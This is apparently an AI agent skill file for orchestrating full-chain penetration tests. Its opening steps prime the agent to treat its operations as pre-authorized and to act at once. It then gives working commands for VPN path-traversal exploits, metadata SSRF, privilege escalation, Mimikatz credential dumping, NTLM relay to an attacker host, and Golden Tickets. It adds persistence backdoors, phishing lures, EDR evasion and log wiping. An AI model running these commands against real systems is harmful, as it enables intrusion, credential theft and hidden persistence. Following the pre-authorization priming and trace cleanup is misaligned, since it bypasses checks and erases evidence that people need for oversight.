---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill

## ACTION REQUIRED (execute right after reading)

1. `NOW`: read `../field-journal/precedent-pentest.md` to confirm that this skill's operations are authorized routine operations
2. `NOW`: **create/update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`); ACT is forbidden while `auth.status!=granted`
3. `NOW`: plan the phases in the **lead** role (`../ops/role-map.md`) and write specialist_roles
4. `NEXT`: read `../tool-index.md` and check tool availability and actual paths
5. `NEXT`: when a tool is missing, call bootstrap; do not guess paths
6. `ACT`: pass the phase gates in `references/lifecycle-checklist.md`; update `timeline.md` + `workitems.md` in each phase (`../ops/timeline-workitem.md`); promote discoveries to Evidence/Finding
7. End: the `docs-generator` report must contain the Evidence chain

> Commander for planning and executing multi-phase attack paths. When a task needs a complete chain "from A to B", this Skill orchestrates the phases, coordinates the sub-skills and plans the attack path.
> Not "red team only": any pentest scenario that combines phases starts here.

---

## When to route to this Skill

These scenarios **must** go through this Skill for full-chain planning first, then dispatch to specific sub-skills:

| Scenario | Why orchestration is needed |
|------|--------------|
| "Do a complete penetration test for me" | Needs planning of the full process from information gathering to report |
| "Go from the internet to the domain controller" | Spans perimeter breach → privilege escalation → lateral movement → AD phases |
| "HW attack and defense drill" | Needs a complete attack chain + stealth + trace cleanup |
| "Assess the attack surface of this target" | Needs multi-dimensional information gathering + path planning |
| "I got a webshell, what next" | Needs planning of later paths from the current foothold |
| "Plan the attack path for me" | Explicitly needs path orchestration |
| "How far can this vulnerability take us" | Needs an assessment of the chained exploitation value of the vulnerability |
| "Continuous Bug Bounty monitoring" | Needs an automated multi-phase process |
| "Full internal network pentest" | Combines lateral movement + privilege escalation + domain attacks |
| "Close-access pentest plan" | Combines physical access + internal network pentest |
| "Supply chain attack path" | Cross-organization multi-hop attack |
| "Phishing + post-exploitation" | Combines initial access + later exploitation |

**Single-phase tasks do not need this Skill**:
- Port scan only → go straight to `pentest-tools/`
- SQL injection only → go straight to `pentest-tools/`
- APK reverse engineering only → go straight to `apk-reverse/`
- Domain pentest only → go straight to `windows-ad/SKILL.md`

---

## Orchestration principles

### Role of this Skill

```
User raises a multi-phase task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path and fix the phase order
    ↓ Assess the tools and methods each phase needs
    ↓
Dispatch to specific sub-skills:
    ├── pentest-tools/     → tool calls, exploitation
    ├── apk-reverse/       → mobile pentest
    ├── js-reverse/        → web front-end breach
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse engineering
    └── browser-automation/ → automated operation
    ↓
After each phase, return to this Skill to assess the next step
    ↓
All done → docs-generator produces the report
```

### Path planning decision tree

```
After you get the target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What do you have now? (external view/existing credentials/existing foothold)
3. What is the final goal? (domain controller/data/specific system/prove impact)
4. Constraints? (time/stealth/systems that must not be touched)
    ↓
Plan the shortest path from this information
    ↓
If one path fails → return to this Skill and plan an alternative path
```

---

## Complete attack chain phases

---

## 1. Information gathering phase (Reconnaissance)

### 1.1 Enterprise digital asset mapping

```bash
# Discover domains linked to subsidiaries
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Liveness probing
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Field notes**:
- Get the subsidiary list from company registries such as Qichacha/Tianyancha to widen the attack surface
- Watch test environments (test., dev., staging.) and newly launched systems
- Certificate transparency logs (crt.sh) reveal hidden domains

### 1.2 Hunting for sensitive information leaks

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT keys
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee information profiling

**Social engineering wordlist generation rules**:
```
{name pinyin}{year}       → zhangsan2024
{name initials}{department abbreviation}  → zs_dev
{employee number}@{domain}          → 10086@target.com
{name}{common suffix}       → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structure
- Company official accounts/website team pages
- Job postings (tech stack exposure)
- Academic papers (email exposure)

### 1.4 Tech stack fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Specific framework probing
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS identification
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Perimeter breach phase (Initial Access)

### 2.1 Web vulnerability exploitation (frequent breach points)

| Vulnerability type | Detection tool | Exploitation |
|---------|---------|---------|
| SQL injection | sqlmap | Data extraction → write a shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal network probing → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Administrator session hijacking |

```bash
# SQL injection automation
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Nuclei batch scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply chain attacks

**Attack path**:
1. Identify the third-party components/service providers the target uses
2. Attack the supplier to gain code signing/update push rights
3. Deliver a malicious payload through the legitimate update channel

**Common entry points**:
- Open source component poisoning (npm/pip/maven)
- SaaS provider API abuse
- Abuse of contractor permissions
- Lateral penetration through shared IT service providers

### 2.3 Phishing attacks

**Email phishing**:
```
Subject templates:
- [Urgent] Your VPN certificate is about to expire, update it now
- [IT notice] Mailbox storage is low, clean it up
- [HR] 2024 annual performance review results lookup
- [Finance] Expense system upgrade, log in again to confirm
```

**Payload types**:
- Office macro documents (.docm/.xlsm)
- LNK shortcuts (disguised as PDF)
- HTML smuggling
- ISO/IMG images (bypass MOTW)
- Scripts embedded in OneNote

**OAuth phishing** (new trend in 2025):
- Build a malicious OAuth app that requests permissions
- Gain mailbox/file access after the user authorizes
- No password needed, bypasses MFA

### 2.4 Close-access pentest (Physical Access)

| Technique | Tool | Effect |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keystroke injection → reverse shell |
| Malicious power bank | O.MG Cable | Backdoor planted in a disguised data cable |
| WiFi phishing | Fluxion / WiFi Pineapple | Fake hotspot → credential capture |
| RFID cloning | Proxmark3 | Access card copy → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Persistent internal network access point |

```bash
# Fluxion WiFi phishing
fluxion  # interactively choose the target AP → create a fake hotspot → capture the WPA password

# BadUSB with Cobalt Strike
# Inject a PowerShell downloader over USB → C2 check-in
```

### 2.5 VPN/remote access breach

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud service breach

```bash
# AWS S3 bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## 3. Privilege escalation phase (Privilege Escalation)

### 3.1 Windows privilege escalation

| Technique | Condition | Tool |
|------|------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerability | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installs a malicious MSI |
| Scheduled tasks | Writable task script | schtasks replacement |

```powershell
# Detect SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated detection
.\winPEAS.exe
```

### 3.2 Linux privilege escalation

```bash
# SUID detection
find / -perm -4000 -type f 2>/dev/null

# sudo abuse
sudo -l
# Commonly exploitable: vim, find, python, nmap, less, awk, perl

# sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerabilities
uname -r  # check the version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated detection
./linpeas.sh
```

### 3.3 Database privilege escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud privilege escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Look for iam:PassRole + lambda:CreateFunction → administrator privileges

# Azure AD
# Global administrator → control of every subscription
# Application administrator → add credentials to a service principal
```

---

## 4. Lateral movement phase (Lateral Movement)

### 4.1 Credential acquisition

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Stealthy lateral movement techniques

```bash
# WMI fileless execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves traces)
psexec.py domain/admin:password@target_ip

# SSH tunnel (Linux environments)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # port forwarding
```

### 4.4 NTLM Relay

```bash
# Turn off Responder's SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM relay to the target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD attack paths

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permissions
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync rights → dump every hash

# Certipy AD CS attacks
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence phase (Persistence)

### 5.1 Windows persistence

| Technique | Stealth | Detection difficulty |
|------|:---:|:---:|
| Scheduled task | Medium | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify the registry F value to clone the RID
```

### 5.2 Linux persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a master password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud environment persistence

```bash
# AWS Lambda backdoor
# Create a scheduled Lambda function that calls back to the C2

# Azure AD application registration
# Create an app → add key credentials → grant Graph API permissions

# Container backdoor
# Modify the base image → every new container carries the backdoor
```

---

## 6. EDR/AV bypass (Evasion)

### 6.1 Core bypass ideas

| Layer | Technique | Notes |
|------|------|------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matches |
| Behavior detection | Indirect syscalls/Unhooking | Bypass API hooks |
| Memory detection | Module stomping/heap encryption | Avoid memory scans |
| Network detection | Domain fronting/legitimate service tunnels | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce traces |

### 6.2 Practical bypass techniques

```
1. Custom shellcode loader (do not use public tools)
2. Direct system calls (bypass ntdll hooks)
3. Choose lightly monitored processes for injection (such as RuntimeBroker.exe)
4. C2 traffic over HTTPS + domain fronting / Cloudflare Workers
5. In-memory execution, nothing written to disk (Fileless)
6. Load through legitimately signed programs (LOLBins)
```

### 6.3 C2 framework choice

| Framework | Characteristics | Use case |
|------|------|---------|
| Cobalt Strike | Mature and stable, team collaboration | Large red team operations |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Needs customization |
| Mythic | Multi-agent support | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Fast deployment |

---

## 7. Trace cleanup (Anti-Forensics)

```bash
# Windows log clearing
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Timestamp modification
touch -t 202301010000 /path/to/file

# Memory cleanup
# Make sure the Mimikatz dump is deleted
# Make sure the C2 beacon has exited
# Make sure temporary files are removed
```

---

## Red team operation rules

### Three bottom lines

1. **Every operation must have written authorization**
2. **Exfiltrated data must be anonymized**
3. **Clean up every attack trace (including memory-resident ones)**

### Operational discipline

- Assess the risk level (low/medium/high/critical) before each operation
- Notify the project manager before high-risk operations
- Keep an operation log (time, action, result)
- Report high-risk vulnerabilities immediately; do not expand exploitation
- Do not affect business availability (DoS is forbidden)
- Do not access or download real user data

### Typical failure cases

| Cause of failure | Consequence | Lesson |
|---------|------|------|
| Mimikatz memory dump not removed | Blue team traced the complete attack path | Clean up right after the operation |
| C2 domain flagged by threat intelligence | Blocked on the first connection | Use a newly registered domain + domain fronting |
| Phishing email triggered a DLP alert | Blue team warned in advance | Test the mail gateway rules |
| Lateral movement triggered a honeypot | Attack intent exposed | Identify honeypots before acting |

---

## Tool quick reference

### Information gathering
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Close-access pentest
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relation to other Skills in this package

| Need | Route to |
|------|--------|
| Deep web vulnerability exploitation | `pentest-tools/SKILL.md` |
| Detailed internal AD attack steps | `windows-ad/SKILL.md` |
| Reverse engineering malicious samples | `reverse-engineering/SKILL.md` |
| APK reverse engineering (mobile pentest) | `apk-reverse/SKILL.md` |
| JS front-end signature bypass | `js-reverse/SKILL.md` |
| Automated swarm pentesting | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted pentesting | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack path diagram | `diagram-generator/SKILL.md` |


## Task completion self-check (MUST pass before claiming completion)

- [ ] Did I execute every step of the workflow (not just read it)?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/report)?
- [ ] Did I complete and write back the Checklist items that RULES requires?
